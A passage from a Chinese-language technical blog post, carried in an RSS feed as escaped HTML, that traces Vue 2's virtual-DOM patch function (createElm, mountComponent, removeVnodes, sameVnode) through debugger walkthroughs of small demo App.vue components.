&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;!&lt;/span&gt;&lt;span&gt;DOCTYPE html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;charset&lt;/span&gt;&lt;span&gt;=&quot;utf-8&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;viewport&quot;&lt;/span&gt;&lt;span&gt; content&lt;/span&gt;&lt;span&gt;=&quot;width=device-width,initial-scale=1.0&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;vue-demo&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;app&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; built files will be auto injected &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;我们依然在Sources面板找到模块中vue源码打断点。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1028445/202003/1028445-20200330120641524-1598821009.png&quot; alt=&quot;&quot; width=&quot;489&quot; height=&quot;264&quot;/&gt;&lt;/p&gt;


&lt;p&gt;oldNode的结构是&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1028445/202003/1028445-20200330125000283-274630260.png&quot; alt=&quot;&quot; width=&quot;194&quot; height=&quot;173&quot;/&gt;&lt;/p&gt;


&lt;p&gt; vnode的结构是&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1028445/202003/1028445-20200330125045266-859975147.png&quot; alt=&quot;&quot; width=&quot;324&quot; height=&quot;268&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1028445/202003/1028445-20200330131835794-1331614081.png&quot; alt=&quot;&quot; width=&quot;337&quot; height=&quot;276&quot;/&gt;&lt;/p&gt;






&lt;p&gt; 我们看到vnode的tag名称是vue-component-4-App。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isUndef(vnode)) {
      &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isDef(oldVnode)) { invokeDestroyHook(oldVnode); }
      &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;
    }

    &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; isInitialPatch = &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; insertedVnodeQueue =&lt;span&gt; [];
&lt;/span&gt;&lt;span&gt;//打头&lt;/span&gt;&lt;span&gt;的代码，逻辑不会进入&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
 &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isUndef(oldVnode)) {
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; empty mount (likely as component), create new root element&lt;/span&gt;
      isInitialPatch = &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
      createElm(vnode, insertedVnodeQueue);
    } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;核心代码&lt;/span&gt;
     oldVnode =&lt;span&gt; emptyNodeAt(oldVnode);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;emptyNodeAt将原有的节点，同时也是DOM节点包装成虚拟节点。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
 &lt;span&gt;//&lt;/span&gt;&lt;span&gt; replacing existing element&lt;/span&gt;
        &lt;span&gt;var&lt;/span&gt; oldElm =&lt;span&gt; oldVnode.elm;
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; parentElm =&lt;span&gt; nodeOps.parentNode(oldElm);
&lt;/span&gt;&lt;span&gt;//parentElm是undefined&lt;/span&gt;&lt;span&gt;
//&lt;/span&gt;&lt;span&gt;创建新节点&lt;/span&gt;
&lt;span&gt;        createElm(
          vnode,
          insertedVnodeQueue,
          &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; extremely rare edge case: do not insert if old element is in a&lt;/span&gt;
          &lt;span&gt;//&lt;/span&gt;&lt;span&gt; leaving transition. Only happens when combining transition +&lt;/span&gt;
          &lt;span&gt;//&lt;/span&gt;&lt;span&gt; keep-alive + HOCs. (#4590)&lt;/span&gt;
          oldElm._leaveCb ? &lt;span&gt;null&lt;/span&gt;&lt;span&gt; : parentElm,
          nodeOps.nextSibling(oldElm)
        );&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;进入createElm函数。vnode是tag名为vue-component-4-App的虚拟节点。parentElm是body元素。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1028445/202003/1028445-20200330151332023-427851511.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;p&gt; createElm函数中由于ownerArray等于undefined，所以打头的if语句为false。接下来到createComponent函数。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (createComponent(vnode, insertedVnodeQueue, parentElm, refElm)) {
      &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1028445/202003/1028445-20200330154202581-705633882.png&quot; alt=&quot;&quot; width=&quot;455&quot; height=&quot;257&quot;/&gt;&lt;/p&gt;


&lt;p&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/1028445/202003/1028445-20200330154451358-2103741419.png&quot; alt=&quot;&quot; width=&quot;349&quot; height=&quot;235&quot;/&gt;&lt;/p&gt;



&lt;div class=&quot;cnblogs_code&quot; readability=&quot;43&quot;&gt;
&lt;pre&gt;
&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isDef(i)) {
      &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; isReactivated = isDef(vnode.componentInstance) &amp;amp;&amp;amp;&lt;span&gt; i.keepAlive;&lt;br/&gt;//根据vnode.data的结构，通过赋值，i调用的是init钩子函数。
      &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (isDef(i = i.hook) &amp;amp;&amp;amp; isDef(i =&lt;span&gt; i.init)) {
        i(vnode, &lt;/span&gt;&lt;span&gt;false&lt;/span&gt; &lt;span&gt;/*&lt;/span&gt;&lt;span&gt; hydrating &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;);
      }
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; after calling the init hook, if the vnode is a child component&lt;/span&gt;
      &lt;span&gt;//&lt;/span&gt;&lt;span&gt; it should've created a child instance and mounted it. the child&lt;/span&gt;
      &lt;span&gt;//&lt;/span&gt;&lt;span&gt; component also has set the placeholder vnode's elm.&lt;/span&gt;
      &lt;span&gt;//&lt;/span&gt;&lt;span&gt; in that case we can just return the element and be done.&lt;/span&gt;
      &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isDef(vnode.componentInstance)) {
        initComponent(vnode, insertedVnodeQueue);
        insert(parentElm, vnode.elm, refElm);
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isTrue(isReactivated)) {
          reactivateComponent(vnode, insertedVnodeQueue, parentElm, refElm);
        }
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;true&lt;/span&gt;&lt;span&gt;
      }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;那么初始化init钩子函数调用，  &lt;span class=&quot;cnblogs_code&quot;&gt;child.$mount(hydrating ? vnode.elm : undefined, hydrating);&lt;/span&gt; 由于hydrating为false,进而进入mount函数。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1028445/202003/1028445-20200330160143491-1229933814.png&quot; alt=&quot;&quot; width=&quot;519&quot; height=&quot;288&quot;/&gt;&lt;/p&gt;


&lt;p&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/1028445/202003/1028445-20200330160551806-1852333647.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;p&gt; mountComponent执行了 &lt;span class=&quot;cnblogs_code&quot;&gt;callHook(vm, 'beforeMount');&lt;/span&gt; 然后运行了update。接下来挂载了watcher。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
 updateComponent = &lt;span&gt;function&lt;/span&gt;&lt;span&gt; () {
      vm._update(vm._render(), hydrating);
    };&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Watcher(vm, updateComponent, noop, {
    before: &lt;/span&gt;&lt;span&gt;function&lt;/span&gt;&lt;span&gt; before () {
      &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (vm._isMounted &amp;amp;&amp;amp; !&lt;span&gt;vm._isDestroyed) {
        callHook(vm, &lt;/span&gt;'beforeUpdate'&lt;span&gt;);
      }
    }
  }, &lt;/span&gt;&lt;span&gt;true&lt;/span&gt; &lt;span&gt;/*&lt;/span&gt;&lt;span&gt; isRenderWatcher &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;);
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;然后又回到了createElm函数。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1028445/202003/1028445-20200330162214401-1055621094.png&quot; alt=&quot;&quot; width=&quot;388&quot; height=&quot;115&quot;/&gt;&lt;/p&gt;


&lt;p&gt; 这里的vnode指的是template中的包裹元素。它的父元素是刚才的tag为vue-component-4-App的元素。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;47&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt;vnode结构&lt;/span&gt;
&lt;span&gt;child: (...)
tag: &lt;/span&gt;&quot;div&quot;&lt;span&gt;
data: undefined
children: (&lt;/span&gt;3&lt;span&gt;) [VNode, VNode, VNode]
text: undefined
elm: undefined
ns: undefined
context: VueComponent {_uid: &lt;/span&gt;1, _isVue: &lt;span&gt;true&lt;/span&gt;&lt;span&gt;, $options: {…}, _renderProxy: Proxy, _self: VueComponent, …}
fnContext: undefined
fnOptions: undefined
fnScopeId: undefined
key: undefined
componentOptions: undefined
componentInstance: undefined
parent: VNode {tag: &lt;/span&gt;&quot;vue-component-4-App&quot;&lt;span&gt;, data: {…}, children: undefined, text: undefined, elm: undefined, …}
raw: &lt;/span&gt;&lt;span&gt;false&lt;/span&gt;&lt;span&gt;
isStatic: &lt;/span&gt;&lt;span&gt;false&lt;/span&gt;&lt;span&gt;
isRootInsert: &lt;/span&gt;&lt;span&gt;true&lt;/span&gt;&lt;span&gt;
isComment: &lt;/span&gt;&lt;span&gt;false&lt;/span&gt;&lt;span&gt;
isCloned: &lt;/span&gt;&lt;span&gt;false&lt;/span&gt;&lt;span&gt;
isOnce: &lt;/span&gt;&lt;span&gt;false&lt;/span&gt;&lt;span&gt;
asyncFactory: undefined
asyncMeta: undefined
isAsyncPlaceholder: &lt;/span&gt;&lt;span&gt;false&lt;/span&gt;&lt;span&gt;
__proto__: Object&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&amp;lt;template&amp;gt;
  &amp;lt;div&amp;gt;
    &amp;lt;img src=&quot;./assets/logo.png&quot;&amp;gt;
    &amp;lt;ul&amp;gt;
      &amp;lt;li v-&lt;span&gt;for&lt;/span&gt;=&quot;item in items&quot;&amp;gt;&lt;span&gt;
        {{ item.message }}&lt;/span&gt;---&lt;span&gt;{{item.id}}
      &lt;/span&gt;&amp;lt;/li&amp;gt;
    &amp;lt;/ul&amp;gt;
    &amp;lt;!--&amp;lt;router-view/&amp;gt;--&amp;gt;
  &amp;lt;/div&amp;gt;
&amp;lt;/template&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1028445/202003/1028445-20200330170330194-1184381254.png&quot; alt=&quot;&quot; width=&quot;357&quot; height=&quot;298&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这时 &lt;span class=&quot;cnblogs_code&quot;&gt;createChildren(vnode, children, insertedVnodeQueue);&lt;/span&gt; 创建各个子元素。通过遍历，最终会将所有子元素通过insert添加到tag为vue-component-4-App的元素上。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1028445/202003/1028445-20200330173200491-1018131191.png&quot; alt=&quot;&quot; width=&quot;723&quot; height=&quot;211&quot;/&gt;&lt;/p&gt;


&lt;p&gt; 最终patch函数返回 &lt;span class=&quot;cnblogs_code&quot;&gt;&lt;span&gt;return&lt;/span&gt; vnode.elm&lt;/span&gt; 节点。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1028445/202003/1028445-20200330202637480-1210158056.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;



&lt;p&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/1028445/202003/1028445-20200330201725614-1520224181.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;p&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/1028445/202003/1028445-20200330202403426-105291561.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;p&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/1028445/202003/1028445-20200330202427403-1390684997.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;p&gt; 从这个分析可以看到初次渲染，会把所有节点最终加入template中的div元素，等到了tag为vue-component-4-App的元素，由于isDef(parentElm)的parentElm为body元素，所以为true。这个时候也可以看到DOM元素有两份，那么就要删除旧的元素  &lt;span class=&quot;cnblogs_code&quot;&gt;removeVnodes(parentElm, [oldVnode], 0, 0);&lt;/span&gt; 。最终运行完毕，呈现正确的DOM结构。&lt;/p&gt;
&lt;p&gt;当还没有运行removeVnodes时DOM结构如截图2。&lt;/p&gt;
&lt;p&gt;图1&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1028445/202003/1028445-20200330205615845-143275418.png&quot; alt=&quot;&quot; width=&quot;580&quot; height=&quot;284&quot;/&gt;&lt;/p&gt;

&lt;p&gt;图2&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/1028445/202003/1028445-20200330205812936-1619896938.png&quot; alt=&quot;&quot; width=&quot;460&quot; height=&quot;343&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 运行完removeVnodes后原有的div#app就被删除了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1028445/202003/1028445-20200330210104894-1709543529.png&quot; alt=&quot;&quot; width=&quot;354&quot; height=&quot;300&quot;/&gt;&lt;/p&gt;

&lt;p&gt; &lt;strong&gt;初次渲染&lt;/strong&gt;我们也可以看到，&lt;strong&gt;总是把所有子元素构成的render树渲染好了再一次性添加到文档中&lt;/strong&gt;。&lt;/p&gt;

&lt;p&gt; DEMO3&lt;/p&gt;
&lt;p&gt;需求是ul中动态删除某个li标签。我们知道要使用唯一ID的key，才能更高效的渲染。我们可以来看一下patch函数中到底发生了什么？&lt;/p&gt;
&lt;p&gt;其他内容同DEMO2，也是按模块化开发来的。&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;58&quot;&gt;
&lt;pre class=&quot;brush:html;gutter:true;&quot;&gt;
//App.vue
&amp;lt;template&amp;gt;
  &amp;lt;div&amp;gt;
    &amp;lt;img src=&quot;./assets/logo.png&quot;&amp;gt;
    &amp;lt;ul&amp;gt;
      &amp;lt;li v-for=&quot;item in items&quot;&amp;gt;
        {{ item.message }}---{{item.id}}
      &amp;lt;/li&amp;gt;
    &amp;lt;/ul&amp;gt;
    &amp;lt;button v-on:click=&quot;addItem()&quot;&amp;gt;添加item&amp;lt;/button&amp;gt;
    &amp;lt;!--&amp;lt;router-view/&amp;gt;--&amp;gt;
  &amp;lt;/div&amp;gt;
&amp;lt;/template&amp;gt;

&amp;lt;script&amp;gt;
  import  Vue from &quot;vue&quot;
export default {
  name: 'App',

  data(){
    return{
      items:[
        {id:1101,message:&quot;VERSACE范思哲&quot;},
        {id:1102,message:&quot;GUCCI古驰男士经典蜜蜂刺绣&quot;},
        {id:1103,message:&quot;BURBERRY巴宝莉男士休闲长袖衬衫&quot;},
        {id:1104,message:&quot;BALLY巴利奢侈品男包&quot;},
        {id:1105,message:&quot;FERRAGAMO菲拉格慕男款休闲皮鞋&quot;}
      ]
    }
  },
  methods:{
    addItem(){
&lt;/pre&gt;
&lt;pre&gt;
this.items.splice(2,1,{id:1106,message:&quot;GUCCI古奇新款小蜜蜂刺绣低帮休闲板鞋男&quot;})
&lt;/pre&gt;
&lt;pre class=&quot;brush:html;gutter:true;&quot;&gt;
} } } &amp;lt;/script&amp;gt; &amp;lt;style&amp;gt; #app { font-family: 'Avenir', Helvetica, Arial, sans-serif; -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-align: center; color: #2c3e50; margin-top: 60px; } li{ list-style: none; } &amp;lt;/style&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 点击按钮 &lt;span class=&quot;cnblogs_code&quot;&gt;&lt;span&gt;this&lt;/span&gt;.items.splice(2,1)&lt;/span&gt; 就会添加一个item。&lt;/p&gt;
&lt;p&gt;我们这次在function  renderList打断点。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;50&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt;App.vue&lt;/span&gt;
&amp;lt;template&amp;gt;
  &amp;lt;div&amp;gt;
    &amp;lt;img src=&quot;./assets/logo.png&quot;&amp;gt;
    &amp;lt;ul&amp;gt;
      &amp;lt;li v-&lt;span&gt;for&lt;/span&gt;=&quot;item in items&quot; &amp;gt;&lt;span&gt;
        {{ item.message }}&lt;/span&gt;---&lt;span&gt;{{item.id}}
      &lt;/span&gt;&amp;lt;/li&amp;gt;
    &amp;lt;/ul&amp;gt;
    &amp;lt;button v-on:click=&quot;addItem()&quot;&amp;gt;添加item&amp;lt;/button&amp;gt;
    &amp;lt;!--&amp;lt;router-view/&amp;gt;--&amp;gt;
  &amp;lt;/div&amp;gt;
&amp;lt;/template&amp;gt;

&amp;lt;script&amp;gt;&lt;span&gt;
  import  Vue from &lt;/span&gt;&quot;vue&quot;&lt;span&gt;
export &lt;/span&gt;&lt;span&gt;default&lt;/span&gt;&lt;span&gt; {
  name: &lt;/span&gt;'App'&lt;span&gt;,

  data(){
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;{
      items:[
        {id:&lt;/span&gt;1101,message:&quot;VERSACE范思哲&quot;&lt;span&gt;},
        {id:&lt;/span&gt;1102,message:&quot;GUCCI古驰男士经典蜜蜂刺绣&quot;&lt;span&gt;},
        {id:&lt;/span&gt;1103,message:&quot;BURBERRY巴宝莉男士休闲长袖衬衫&quot;&lt;span&gt;},
        {id:&lt;/span&gt;1104,message:&quot;BALLY巴利奢侈品男包&quot;&lt;span&gt;},
        {id:&lt;/span&gt;1105,message:&quot;FERRAGAMO菲拉格慕男款休闲皮鞋&quot;&lt;span&gt;}
      ]
    }
  },
  methods:{
    addItem(){
      &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.items.push({id:1106,message:&quot;GUCCI古奇新款小蜜蜂刺绣低帮休闲板鞋男&quot;&lt;span&gt;});
    }
  }
}
&lt;/span&gt;&amp;lt;/script&amp;gt;

&amp;lt;style&amp;gt;&lt;span&gt;
#app {
  font&lt;/span&gt;-family: 'Avenir', Helvetica, Arial, sans-&lt;span&gt;serif;
  &lt;/span&gt;-webkit-font-&lt;span&gt;smoothing: antialiased;
  &lt;/span&gt;-moz-osx-font-&lt;span&gt;smoothing: grayscale;
  text&lt;/span&gt;-&lt;span&gt;align: center;
  color: #2c3e50;
  margin&lt;/span&gt;-&lt;span&gt;top: 60px;
}
  li{
    list&lt;/span&gt;-&lt;span&gt;style: none;
  }
&lt;/span&gt;&amp;lt;/style&amp;gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;首先看初次渲染时的参数情况。val为包含5个子元素的类数组。进入第一个if分支，render返回li标签的虚拟节点，节点含有并且含有key属性，并添加到ret数组。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1028445/202003/1028445-20200330220038616-1528872641.png&quot; alt=&quot;&quot; width=&quot;431&quot; height=&quot;285&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1028445/202003/1028445-20200330222549486-1620055153.png&quot; alt=&quot;&quot; width=&quot;345&quot; height=&quot;279&quot;/&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;if&lt;/span&gt; (Array.isArray(val) || &lt;span&gt;typeof&lt;/span&gt; val === 'string'&lt;span&gt;) {
    ret &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Array(val.length);
    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (i = 0, l = val.length; i &amp;lt; l; i++&lt;span&gt;) {
      ret[i] &lt;/span&gt;=&lt;span&gt; render(val[i], i);
    }
  }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt; 如果我们push新的值，ret为6个元素了。那么接下来就会打断点运行到patchVnode，其中sameVnode通过key来比较是否是同一个节点。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;function&lt;/span&gt;&lt;span&gt; sameVnode (a, b) {
  &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; (
    a.key &lt;/span&gt;=== b.key &amp;amp;&amp;amp;&lt;span&gt; (
      (
        a.tag &lt;/span&gt;=== b.tag &amp;amp;&amp;amp;&lt;span&gt;
        a.isComment &lt;/span&gt;=== b.isComment &amp;amp;&amp;amp;&lt;span&gt;
        isDef(a.data) &lt;/span&gt;=== isDef(b.data) &amp;amp;&amp;amp;&lt;span&gt;
        sameInputType(a, b)
      ) &lt;/span&gt;||&lt;span&gt; (
        isTrue(a.isAsyncPlaceholder) &lt;/span&gt;&amp;amp;&amp;amp;&lt;span&gt;
        a.asyncFactory &lt;/span&gt;=== b.asyncFactory &amp;amp;&amp;amp;&lt;span&gt;
        isUndef(b.asyncFactory.error)
      )
    )
  )&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt;如果旧的虚拟节点和新的节点是相同的，那么不用作渲染。&lt;/span&gt;
&lt;span&gt;if&lt;/span&gt; (oldVnode ===&lt;span&gt; vnode) {
      &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 更详细的参考一些v-for指令的源码，这里只涉及patch函数相关的。&lt;/p&gt;
</description>
<pubDate>Mon, 30 Mar 2020 15:06:00 +0000</pubDate>
<dc:creator>陈蒙的技术空间</dc:creator>
<og:description>目录 1.patch函数的脉络 2.类vnode的设计 3.createPatch函数中的辅助函数和patch函数 4.源码运行展示(DEMO) 一.patch函数的脉络 首先梳理一下patch函数的</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/chenmeng2062/p/12552302.html</dc:identifier>
</item>
</channel>
</rss>